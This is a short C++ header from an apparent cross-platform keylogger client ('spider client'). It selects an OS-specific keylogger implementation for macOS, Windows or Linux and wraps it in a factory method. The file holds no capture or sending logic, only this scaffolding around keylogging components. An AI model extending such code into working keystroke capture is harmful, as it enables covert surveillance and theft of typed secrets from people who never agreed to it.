//
// Created by roman sztergbaum on 27/09/2017.
//

#ifndef SPIDER_CLIENT_KEYLOGGERFACTORY_HPP
#define SPIDER_CLIENT_KEYLOGGERFACTORY_HPP

#include <utils/Config.hpp>
#include "LogHandle.hpp"
#include "KeyLogger.hpp"

#ifdef USING_OSX
#include "details/OSXKeyLogger.hpp"
#elif defined(USING_WINDOWS)
#include "details/WinKeyLogger.hpp"
#elif defined(USING_LINUX)
#include "details/LinuxKeyLogger.hpp"
#endif

namespace spi
{
    class Factory
    {
    public:
        static always_inline KeyLogPtr

        createKeyLogger()
        {
            return details::createKeyLogger();
        }
    };
}

#endif //SPIDER_CLIENT_KEYLOGGERFACTORY_HPP
